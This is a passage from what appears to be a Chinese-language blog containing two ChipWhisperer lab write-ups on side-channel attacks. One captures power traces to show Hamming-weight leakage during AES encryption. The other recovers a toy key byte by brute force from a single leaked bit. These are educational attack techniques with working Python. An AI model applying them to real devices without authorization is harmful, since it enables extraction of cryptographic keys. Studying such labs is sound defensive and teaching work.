    <url>/2023/05/24/%E6%B5%8B%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94Hamming-Weight-Swings/</url>
    <content><![CDATA[<p>实验：以Hamming Weight为标准，对不同数据进行AES加密能耗的差别</p>
<p>Hamming Weight：二进制数中包含’1’的个数</p>
<p>我们作出一个假设：data line上的比特位会消耗可测量的功耗。</p>
<p>对0x00（包含0个1）和0xff（包含8个1）这两个权重很极端的数据进行测试，设置trace的量为100，当设备运行AES算法时，对这两个文本加密，如果假设正确，那么在高权重和低权重的功耗曲线上能观察到可测量的差异。目前，这些功耗曲线都混在一起了。将它们分成两组：one_list和zero_list。检查第一个字节来检查是否为0x00，并假设如果不是0x00就是0xFF。以下是一个简单的迭代循环来打印它们：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tnrange</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">ktp = cw.ktp.Basic()</span><br><span class="line">trace_array = []</span><br><span class="line">textin_array = []</span><br><span class="line"></span><br><span class="line">key, text = ktp.<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">target.set_key(key)</span><br><span class="line"></span><br><span class="line">N = <span class="number">100</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tnrange(N, desc=<span class="string">&#x27;Capturing traces&#x27;</span>):</span><br><span class="line">    scope.arm()</span><br><span class="line">    <span class="keyword">if</span> text[<span class="number">0</span>] &amp; <span class="number">0x01</span>:</span><br><span class="line">        text[<span class="number">0</span>] = <span class="number">0xFF</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        text[<span class="number">0</span>] = <span class="number">0x00</span></span><br><span class="line">    target.simpleserial_write(<span class="string">&#x27;p&#x27;</span>, text)</span><br><span class="line">    </span><br><span class="line">    ret = scope.capture()</span><br><span class="line">    <span class="keyword">if</span> ret:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Target timed out!&quot;</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    </span><br><span class="line">    response = target.simpleserial_read(<span class="string">&#x27;r&#x27;</span>, <span class="number">16</span>)</span><br><span class="line">    </span><br><span class="line">    trace_array.append(scope.get_last_trace())</span><br><span class="line">    textin_array.append(text)</span><br><span class="line">    </span><br><span class="line">    key, text = ktp.<span class="built_in">next</span>()</span><br></pre></td></tr></table></figure>

<p>将数据分为两组，并将结果转为numpy array类型</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">zero_list=[]</span><br><span class="line">one_list=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(trace_array)):</span><br><span class="line">    <span class="keyword">if</span> textin_array[i][<span class="number">0</span>] == <span class="number">0x00</span>:</span><br><span class="line">        zero_list.append(trace_array[i])</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        one_list.append(trace_array[i])</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">one_list=np.array(one_list)</span><br><span class="line">zero_list=np.array(zero_list)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(one_list) &gt; <span class="built_in">len</span>(zero_list)/<span class="number">2</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(zero_list) &gt; <span class="built_in">len</span>(one_list)/<span class="number">2</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>对两组数据用np.mean求均值，得到zero_avg和one_avg</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">trace_length = <span class="built_in">len</span>(one_list[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Traces had original sample length of %d&quot;</span>%trace_length)</span><br><span class="line"></span><br><span class="line">one_avg=np.mean(one_list, axis=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(one_avg) != trace_length:</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;Average length is only %d - check you did correct dimensions!&quot;</span>%one_avg)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">trace_length = <span class="built_in">len</span>(zero_list[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Traces had original sample length of %d&quot;</span>%trace_length)</span><br><span class="line"></span><br><span class="line">zero_avg=np.mean(zero_list, axis=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(zero_avg) != trace_length:</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;Average length is only %d - check you did correct dimensions!&quot;</span>%zero_avg)</span><br></pre></td></tr></table></figure>

<p>用图形表示两组的差异</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">%matplotlib notebook</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">diff = one_avg[:<span class="number">1000</span>] - zero_avg[:<span class="number">1000</span>]</span><br><span class="line"></span><br><span class="line">plt.plot(<span class="built_in">abs</span>(diff))</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p>在100的位置可以看到一个明显的峰值，其余部分的差异都非常小</p>
<img src="https://re1own.github.io/assets/img/测信道攻击——Hamming-Weight-Swings/image-20230525003148705.png" alt="image-20230525003148705" style="zoom:50%;">

<p>把trace换成1000，发现还是在100的时候变化最大，那么那个点可能就是在aes加密的节点</p>
<img src="https://re1own.github.io/assets/img/测信道攻击——Hamming-Weight-Swings/image-20230525004414856.png" alt="image-20230525004414856" style="zoom:50%;">



<p>Reference</p>
<p><a href="https://github.com/newaetech/chipwhisperer-jupyter">Chipwhisperer-Jupyter</a></p>
]]></content>
      <tags>
        <tag>SCA</tag>
        <tag>Power Analysis Attack</tag>
      </tags>
  </entry>
  <entry>
    <title>测信道攻击——利用一个bit恢复AES key</title>
    <url>/2023/05/25/%E6%B5%8B%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E5%88%A9%E7%94%A8%E4%B8%80%E4%B8%AAbit%E6%81%A2%E5%A4%8DAES-key/</url>
    <content><![CDATA[<p>前面对<a href="https://re1own.github.io/2023/05/20/SCA/">AES原理</a>做了解释，而本实验的AES是一个半AES，因为没有那么复杂，非常简单，方便初学者理解。这次实验不用硬件设备。实验的目的就是通过一个bit位的泄漏，即使不知道key，但知道加密算法也可以恢复完整的AES key，这个方法非常妙！</p>
<p>简单来说，本实验的阉割版AES长这样：</p>
<p><img src="https://re1own.github.io/assets/img/%E6%B5%8B%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E5%88%A9%E7%94%A8%E4%B8%80%E4%B8%AAbit%E6%81%A2%E5%A4%8DAES-key/image-20230525022643294.png" alt="image-20230525022643294"></p>
<p>S-box</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sbox = [</span><br><span class="line">    <span class="comment"># 0    1    2    3    4    5    6    7    8    9    a    b    c    d    e    f </span></span><br><span class="line">    <span class="number">0x63</span>,<span class="number">0x7c</span>,<span class="number">0x77</span>,<span class="number">0x7b</span>,<span class="number">0xf2</span>,<span class="number">0x6b</span>,<span class="number">0x6f</span>,<span class="number">0xc5</span>,<span class="number">0x30</span>,<span class="number">0x01</span>,<span class="number">0x67</span>,<span class="number">0x2b</span>,<span class="number">0xfe</span>,<span class="number">0xd7</span>,<span class="number">0xab</span>,<span class="number">0x76</span>, <span class="comment"># 0</span></span><br><span class="line">    <span class="number">0xca</span>,<span class="number">0x82</span>,<span class="number">0xc9</span>,<span class="number">0x7d</span>,<span class="number">0xfa</span>,<span class="number">0x59</span>,<span class="number">0x47</span>,<span class="number">0xf0</span>,<span class="number">0xad</span>,<span class="number">0xd4</span>,<span class="number">0xa2</span>,<span class="number">0xaf</span>,<span class="number">0x9c</span>,<span class="number">0xa4</span>,<span class="number">0x72</span>,<span class="number">0xc0</span>, <span class="comment"># 1</span></span><br><span class="line">    <span class="number">0xb7</span>,<span class="number">0xfd</span>,<span class="number">0x93</span>,<span class="number">0x26</span>,<span class="number">0x36</span>,<span class="number">0x3f</span>,<span class="number">0xf7</span>,<span class="number">0xcc</span>,<span class="number">0x34</span>,<span class="number">0xa5</span>,<span class="number">0xe5</span>,<span class="number">0xf1</span>,<span class="number">0x71</span>,<span class="number">0xd8</span>,<span class="number">0x31</span>,<span class="number">0x15</span>, <span class="comment"># 2</span></span><br><span class="line">    <span class="number">0x04</span>,<span class="number">0xc7</span>,<span class="number">0x23</span>,<span class="number">0xc3</span>,<span class="number">0x18</span>,<span class="number">0x96</span>,<span class="number">0x05</span>,<span class="number">0x9a</span>,<span class="number">0x07</span>,<span class="number">0x12</span>,<span class="number">0x80</span>,<span class="number">0xe2</span>,<span class="number">0xeb</span>,<span class="number">0x27</span>,<span class="number">0xb2</span>,<span class="number">0x75</span>, <span class="comment"># 3</span></span><br><span class="line">    <span class="number">0x09</span>,<span class="number">0x83</span>,<span class="number">0x2c</span>,<span class="number">0x1a</span>,<span class="number">0x1b</span>,<span class="number">0x6e</span>,<span class="number">0x5a</span>,<span class="number">0xa0</span>,<span class="number">0x52</span>,<span class="number">0x3b</span>,<span class="number">0xd6</span>,<span class="number">0xb3</span>,<span class="number">0x29</span>,<span class="number">0xe3</span>,<span class="number">0x2f</span>,<span class="number">0x84</span>, <span class="comment"># 4</span></span><br><span class="line">    <span class="number">0x53</span>,<span class="number">0xd1</span>,<span class="number">0x00</span>,<span class="number">0xed</span>,<span class="number">0x20</span>,<span class="number">0xfc</span>,<span class="number">0xb1</span>,<span class="number">0x5b</span>,<span class="number">0x6a</span>,<span class="number">0xcb</span>,<span class="number">0xbe</span>,<span class="number">0x39</span>,<span class="number">0x4a</span>,<span class="number">0x4c</span>,<span class="number">0x58</span>,<span class="number">0xcf</span>, <span class="comment"># 5</span></span><br><span class="line">    <span class="number">0xd0</span>,<span class="number">0xef</span>,<span class="number">0xaa</span>,<span class="number">0xfb</span>,<span class="number">0x43</span>,<span class="number">0x4d</span>,<span class="number">0x33</span>,<span class="number">0x85</span>,<span class="number">0x45</span>,<span class="number">0xf9</span>,<span class="number">0x02</span>,<span class="number">0x7f</span>,<span class="number">0x50</span>,<span class="number">0x3c</span>,<span class="number">0x9f</span>,<span class="number">0xa8</span>, <span class="comment"># 6</span></span><br><span class="line">    <span class="number">0x51</span>,<span class="number">0xa3</span>,<span class="number">0x40</span>,<span class="number">0x8f</span>,<span class="number">0x92</span>,<span class="number">0x9d</span>,<span class="number">0x38</span>,<span class="number">0xf5</span>,<span class="number">0xbc</span>,<span class="number">0xb6</span>,<span class="number">0xda</span>,<span class="number">0x21</span>,<span class="number">0x10</span>,<span class="number">0xff</span>,<span class="number">0xf3</span>,<span class="number">0xd2</span>, <span class="comment"># 7</span></span><br><span class="line">    <span class="number">0xcd</span>,<span class="number">0x0c</span>,<span class="number">0x13</span>,<span class="number">0xec</span>,<span class="number">0x5f</span>,<span class="number">0x97</span>,<span class="number">0x44</span>,<span class="number">0x17</span>,<span class="number">0xc4</span>,<span class="number">0xa7</span>,<span class="number">0x7e</span>,<span class="number">0x3d</span>,<span class="number">0x64</span>,<span class="number">0x5d</span>,<span class="number">0x19</span>,<span class="number">0x73</span>, <span class="comment"># 8</span></span><br><span class="line">    <span class="number">0x60</span>,<span class="number">0x81</span>,<span class="number">0x4f</span>,<span class="number">0xdc</span>,<span class="number">0x22</span>,<span class="number">0x2a</span>,<span class="number">0x90</span>,<span class="number">0x88</span>,<span class="number">0x46</span>,<span class="number">0xee</span>,<span class="number">0xb8</span>,<span class="number">0x14</span>,<span class="number">0xde</span>,<span class="number">0x5e</span>,<span class="number">0x0b</span>,<span class="number">0xdb</span>, <span class="comment"># 9</span></span><br><span class="line">    <span class="number">0xe0</span>,<span class="number">0x32</span>,<span class="number">0x3a</span>,<span class="number">0x0a</span>,<span class="number">0x49</span>,<span class="number">0x06</span>,<span class="number">0x24</span>,<span class="number">0x5c</span>,<span class="number">0xc2</span>,<span class="number">0xd3</span>,<span class="number">0xac</span>,<span class="number">0x62</span>,<span class="number">0x91</span>,<span class="number">0x95</span>,<span class="number">0xe4</span>,<span class="number">0x79</span>, <span class="comment"># a</span></span><br><span class="line">    <span class="number">0xe7</span>,<span class="number">0xc8</span>,<span class="number">0x37</span>,<span class="number">0x6d</span>,<span class="number">0x8d</span>,<span class="number">0xd5</span>,<span class="number">0x4e</span>,<span class="number">0xa9</span>,<span class="number">0x6c</span>,<span class="number">0x56</span>,<span class="number">0xf4</span>,<span class="number">0xea</span>,<span class="number">0x65</span>,<span class="number">0x7a</span>,<span class="number">0xae</span>,<span class="number">0x08</span>, <span class="comment"># b</span></span><br><span class="line">    <span class="number">0xba</span>,<span class="number">0x78</span>,<span class="number">0x25</span>,<span class="number">0x2e</span>,<span class="number">0x1c</span>,<span class="number">0xa6</span>,<span class="number">0xb4</span>,<span class="number">0xc6</span>,<span class="number">0xe8</span>,<span class="number">0xdd</span>,<span class="number">0x74</span>,<span class="number">0x1f</span>,<span class="number">0x4b</span>,<span class="number">0xbd</span>,<span class="number">0x8b</span>,<span class="number">0x8a</span>, <span class="comment"># c</span></span><br><span class="line">    <span class="number">0x70</span>,<span class="number">0x3e</span>,<span class="number">0xb5</span>,<span class="number">0x66</span>,<span class="number">0x48</span>,<span class="number">0x03</span>,<span class="number">0xf6</span>,<span class="number">0x0e</span>,<span class="number">0x61</span>,<span class="number">0x35</span>,<span class="number">0x57</span>,<span class="number">0xb9</span>,<span class="number">0x86</span>,<span class="number">0xc1</span>,<span class="number">0x1d</span>,<span class="number">0x9e</span>, <span class="comment"># d</span></span><br><span class="line">    <span class="number">0xe1</span>,<span class="number">0xf8</span>,<span class="number">0x98</span>,<span class="number">0x11</span>,<span class="number">0x69</span>,<span class="number">0xd9</span>,<span class="number">0x8e</span>,<span class="number">0x94</span>,<span class="number">0x9b</span>,<span class="number">0x1e</span>,<span class="number">0x87</span>,<span class="number">0xe9</span>,<span class="number">0xce</span>,<span class="number">0x55</span>,<span class="number">0x28</span>,<span class="number">0xdf</span>, <span class="comment"># e</span></span><br><span class="line">    <span class="number">0x8c</span>,<span class="number">0xa1</span>,<span class="number">0x89</span>,<span class="number">0x0d</span>,<span class="number">0xbf</span>,<span class="number">0xe6</span>,<span class="number">0x42</span>,<span class="number">0x68</span>,<span class="number">0x41</span>,<span class="number">0x99</span>,<span class="number">0x2d</span>,<span class="number">0x0f</span>,<span class="number">0xb0</span>,<span class="number">0x54</span>,<span class="number">0xbb</span>,<span class="number">0x16</span>  <span class="comment"># f</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>定义aes_internal用于返回加密后的秘文，加密后的秘文就是AES key和输入异或的值在s-box中对应的数值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aes_internal</span>(<span class="params">inputdata, key</span>):</span></span><br><span class="line">    <span class="keyword">return</span> sbox[inputdata ^ key]</span><br></pre></td></tr></table></figure>

<p>这里可以验证一下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">assert</span>(aes_internal(<span class="number">0xAB</span>, <span class="number">0xEF</span>) == <span class="number">0x1B</span>)</span><br><span class="line"><span class="keyword">assert</span>(aes_internal(<span class="number">0x22</span>, <span class="number">0x01</span>) == <span class="number">0x26</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;✔️ OK to continue!&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>接下来就是设置一个要攻击的目标，定义一个新的函数aes_secret，不透露key，内置一个固定的key。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aes_secret</span>(<span class="params">inputdata</span>):</span></span><br><span class="line">    secret_key = <span class="number">0xEF</span></span><br><span class="line">    <span class="keyword">return</span> aes_internal(secret_key, inputdata)</span><br></pre></td></tr></table></figure>

<p>这段代码就是教我们怎么用python生成随机数，并且通过加密函数得到output（这里somefunc是一个例子，不是前面说的要用的加密函数）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">##Some Python hints/useful functions:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># You can use this function to generate the random data</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">random.randint(<span class="number">0</span>, <span class="number">255</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># List comprehension can be used to shovel data through a function</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">somefunc</span>(<span class="params">a</span>):</span></span><br><span class="line">    <span class="keyword">return</span> a + <span class="number">4</span></span><br><span class="line">input_data = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line">output_data = [somefunc(a) <span class="keyword">for</span> a <span class="keyword">in</span> input_data]</span><br><span class="line"></span><br><span class="line"><span class="comment"># You can use this while ignoring the index variable too</span></span><br><span class="line">output_data = [somefunc(random.randint(<span class="number">0</span>,<span class="number">255</span>)) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">1000</span>)]</span><br></pre></td></tr></table></figure>

<p>生成1000个0～255的随机整数：</p>
<p><code>input_data = [random.randint(0,255) for _ in range(0, 1000)]</code></p>
<p>接下来是生成泄漏数据，取input的最低bit位，&amp; 0x01就是取最低比特位的作用，这样计算出来就能把最低比特位给泄漏</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">leaked_data = [(aes_secret(a) &amp; 0x01) for a in input_data]</span><br></pre></td></tr></table></figure>

<p>输出的就是泄漏的1000个数据每个数据最低比特位数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 0, 1, 0, 0, 1, 0, 0, 0, 1, 1, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 0, 0, 0, 0, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 1, 1, 1, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 0, 0, 0, 1, 0, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 1, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 1, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 1]</span><br></pre></td></tr></table></figure>

<p>通过画图可以直观查看泄漏数据leaked_data的内容</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pylab <span class="keyword">as</span> plt</span><br><span class="line">plt.plot(leaked_data[<span class="number">0</span>:<span class="number">200</span>])</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<img src="https://re1own.github.io/assets/img/测信道攻击——利用一个bit恢复AES-key/image-20230526204914834.png" alt="image-20230526204914834" style="zoom:50%;">

<p>这里介绍一下要获得两个list相同元素的数量可以先转化为numpy array，然后两个array进行比较，最后sum出True(1)的数量</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">num_same</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(a) != <span class="built_in">len</span>(b):</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Arrays must be same length!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">max</span>(a) != <span class="built_in">max</span>(b):</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Arrays max() should be the same!&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#Count how many list items match up</span></span><br><span class="line">    same = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i, _ <span class="keyword">in</span> <span class="built_in">enumerate</span>(a):</span><br><span class="line">        <span class="keyword">if</span> a[i] == b[i]:</span><br><span class="line">            same += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> same</span><br></pre></td></tr></table></figure>

<p>可以检测下是否正确实现代码块</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Simple test vectors - if you get the check-mark printed all OK.</span></span><br><span class="line"><span class="keyword">assert</span>(num_same([<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>], [<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>]) == <span class="number">8</span>)</span><br><span class="line"><span class="keyword">assert</span>(num_same([<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>], [<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>]) == <span class="number">2</span>)</span><br><span class="line"><span class="keyword">assert</span>(num_same([<span class="number">1</span>, <span class="number">0</span>], [<span class="number">0</span>, <span class="number">1</span>]) == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;✔️ OK to continue!&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>那么利用上面比特位的泄漏方式以及判断两个array是否相同的方法， 我们就可以枚举所有key的可能，key的一个字节就是0x00~0xff，将这些所有可能去加密相同的input_data得到key_guess，再将结果和泄漏数据的这个list进行比较，看是否相同！发现EF是1000，代表之前随机生成的1000个数据，在AES加密后生成的密文的最低比特位（1000个数据1000个最低比特位）与我们从枚举一个字节的所有可能值（0x00～0xFF）中的0xEF对同样的明文加密后，产生的密文是一样的！（因为最低比特位1000个都一样，而且唯一也就它是正好1000），所以0xEF就是密钥key的一个固定字节！那么按照这个思路，继续猜测密文的其他字节也同样可行，这招真的是妙啊！</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Guess 00:  487 bits same</span><br><span class="line">Guess 01:  431 bits same</span><br><span class="line">Guess 02:  495 bits same</span><br><span class="line">Guess 03:  493 bits same</span><br><span class="line">....</span><br><span class="line">....</span><br><span class="line">....</span><br><span class="line">Guess EE:  476 bits same</span><br><span class="line">Guess EF: 1000 bits same</span><br><span class="line">Guess F0:  495 bits same</span><br><span class="line">Guess F1:  473 bits same</span><br><span class="line">Guess F2:  459 bits same</span><br><span class="line">Guess F3:  473 bits same</span><br><span class="line">Guess F4:  503 bits same</span><br><span class="line">Guess F5:  453 bits same</span><br><span class="line">Guess F6:  493 bits same</span><br><span class="line">Guess F7:  535 bits same</span><br><span class="line">Guess F8:  451 bits same</span><br><span class="line">Guess F9:  570 bits same</span><br><span class="line">Guess FA:  477 bits same</span><br><span class="line">Guess FB:  457 bits same</span><br><span class="line">Guess FC:  539 bits same</span><br><span class="line">Guess FD:  465 bits same</span><br><span class="line">Guess FE:  461 bits same</span><br><span class="line">Guess FF:  543 bits same</span><br></pre></td></tr></table></figure>

<p>上面已经够妙了，然鹅我们还可以在算法上更优化下，不那么傻傻地一个个找了，怎么做呢？这里先介绍下numpy的argsort用法，np.argsort函数用来输出从小到大数值对应的index，这里输出就是“0 3 4 1 2“，要从大到小就是[::-1]或者np.argsort(-np.array(list()))</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">count_list = [<span class="number">2</span>, <span class="number">7</span>, <span class="number">24</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line"></span><br><span class="line">np.argsort(count_list)</span><br></pre></td></tr></table></figure>

<p>到这里，应该能知道为啥要介绍这个函数了吧，我们可以直接把结果从大到小排序，只考虑前五个guess key的结果</p>
